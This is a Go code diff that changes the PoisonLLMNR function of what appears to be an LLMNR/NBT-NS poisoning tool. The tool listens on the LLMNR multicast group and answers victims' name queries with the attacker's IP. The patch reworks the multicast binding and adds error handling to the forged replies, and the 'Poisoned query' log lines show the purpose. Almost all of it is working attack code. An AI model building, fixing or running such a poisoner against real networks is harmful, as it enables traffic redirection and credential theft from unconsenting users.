@@ -18,12 +18,18 @@ func PoisonLLMNR(ifaceIP net.IP) {
 		core.LogError("LLMNR: no interface for %s - %v", ifaceIP, err)
 		return
 	}
-	group := &net.UDPAddr{IP: net.ParseIP(llmnrMulticast), Port: llmnrPort}
-	conn, err := net.ListenMulticastUDP("udp4", iface, group)
-	if err != nil {
-		core.LogError("LLMNR: requires root privileges to join multicast - %v", err)
+	groupIP := net.ParseIP(llmnrMulticast).To4()
+	if groupIP == nil {
+		core.LogError("LLMNR: bad multicast address %q", llmnrMulticast)
 		return
 	}
+
+	pc, err := listenMulticast(iface, ifaceIP, [4]byte{groupIP[0], groupIP[1], groupIP[2], groupIP[3]}, llmnrPort, 0)
+	if err != nil {
+		core.LogError("LLMNR: bind :%d failed (root?) - %v", llmnrPort, err)
+		return
+	}
+	conn := pc.(*net.UDPConn)
 	defer conn.Close()
 	core.LogInfo("LLMNR listening on %s (UDP %d, multicast %s)", ifaceIP, llmnrPort, llmnrMulticast)
 
@@ -53,8 +59,11 @@ func PoisonLLMNR(ifaceIP net.IP) {
 		}
 		resp := BuildLLMNRResponse(pkt, ifaceIP)
 		if resp != nil {
-			conn.WriteTo(resp, src)
-			core.LogInfo("[LLMNR] Poisoned query for '%s' - responding with %s", name, ifaceIP)
+			if _, err := conn.WriteToUDP(resp, src); err != nil {
+				core.LogError("[LLMNR] send to %s FAILED: %v", src, err)
+			} else {
+				core.LogInfo("[LLMNR] Poisoned query for '%s' - responding with %s", name, ifaceIP)
+			}
 		}
 	}
 }
